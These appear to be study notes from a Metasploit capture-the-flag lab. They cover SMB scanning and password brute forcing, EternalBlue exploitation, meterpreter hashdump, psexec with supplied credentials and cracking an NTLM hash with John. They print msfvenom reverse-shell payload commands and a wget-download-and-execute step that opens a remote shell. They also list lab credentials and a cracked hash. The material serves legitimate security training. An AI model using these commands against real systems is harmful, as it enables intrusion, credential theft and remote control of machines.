
- common metasploit commands :
> launch `msfconsole` --> we can do `ls`, `ping -c 1 8.8.8.8`, `clear`,`history` (this gives all used commands) , but `output redirection '>'` is not allowed.

### _Metasploit Exploitation_

- there are many `port scan` modules and we can use them by doing `search portscan` on `msfconsole` terminal and use the modules by their index number, then run `show options` and configure the concurrency, RHOSTS, ports and threads
- for `UDP scan`, we use `udp_sweep` module and for `SMB scan`, we use `smb_enumshares` and `smb_version` modules
- we are given a target IP ,  we run `nmap IP` and find out thee is `5` open ports and then we use `netbios/nbname` module to find out what netbios name is running and it is `ACME IT SUPPORT`
- To find password of a user called `penny` on doing SMB login, we use the `smb_login` module and set up all the configurations and use the given `Metasploitwordlist.txt` for passwords and we get a hit for correct password as `leo1234`

##### _The Metasploit Database_
- first run `systemctl start postgresql` and then do `msfdb init` command on the `msf6` console, now we can check the database status by running `db_status`

>You may want to look for low-hanging fruits such as:
>HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
  FTP: Could allow anonymous login and provide access to interesting files. 
  SMB: Could be vulnerable to SMB exploits like MS17-010
  SSH: Could have default or easy to guess credentials
  RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 

- we don't always have to use the default payload we can do `show payloads` and do `set payload n` and use a different payload
- we've to exploit the critical vulnerability in the VM and we run nmap scan `nmap -sC [IP] --vv` , and then we use the `ms17-010/eternalblue` module and set the configurations and run the exploit
- we get `meterpreter` shell where we can run linux commands so we do `search -f flag.txt` and it gives us the location so we navigate to that file and cat it out and get the flag 
- then we have to find the `NTLM hash` of a user called pirate so we run `hashdump` on the meterpreter and we get the hash and the last part separated by `:` is the `NTLM` hash

###### _Payloads_
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf --> linux executable and linkable format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe --> windows .exe file
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php --> reverse php shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp --> reverse asp shell
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py 
--> reverse python shell
```

#### _Using msfvenom_
- start up msfconsole on normal terminal and use the `multi/handler` module as a listener, something like a `nc listener`, so do `show options` and set up the configurations `LHOST`,`LPORT` and do `set payload linux/x86/meterpreter/reverse_tcp` and click on run and it will listen for any activity
- then in another terminal, set up a python server by `python3 -m http.server 9000` and do ssh login into the creds they've provided `murphy:1q2w3e4r` , then do `sudo su` and obtain `root shell` 
- now with `msfvenom`, let's create the same payload in a new terminal by doing `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacking_IP LPORT=4444 -f elf > rev_shell.elf`
- now in the root shell run `wget http://attacking_IP:9000/rev_shell.elf` and it gets downloaded onto the ssh machine, now give it executable permissions by `chmod 777 rev_shell.elf` and then do `./rev_shell.elf` and in our multi handler terminal we get meterpreter session
- now to dump the hashes use the module by doing `run post/linux/gather/hashdump` and we get the hash of `claire`.

### _Metasploit : Meterpreter (Post Exploitation Challenge)
- perform an nmap scan - `nmap -sC -sV [IP] -vv`, then launch the `msfconsole` and do `use  exploit/windows/smb/psexec` and do `show options` , proceed to configure the rhosts, lhost and SMBUser and SMBPass (creds are `ballen:Password1`)
- now run the exploit and we get a meterpreter session, do `sysinfo` and we get Computer Name and Domain name, to find the name of the share that's likely used, do the following
- `background` the current session and get back to msfconsole, then `use post/windows/gather/enum_shares` and do `set session 1` then do `run` and it shows the possible shares out of which we identify a share called `speedster`, now to get back to meterpreter do `session -i 1` and run `hashdump` for the NTLM hash of user `jchambers`
- we get the NTLM hash as `69596c7aa1e8daee17f8e78870e25a5c`, so we will crack it using John
> `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash`
> cracked = **Trustno1**
- to find `secrets.txt` do `search -f secrets.txt` and navigate to that directory and cat out the contents to submit
---
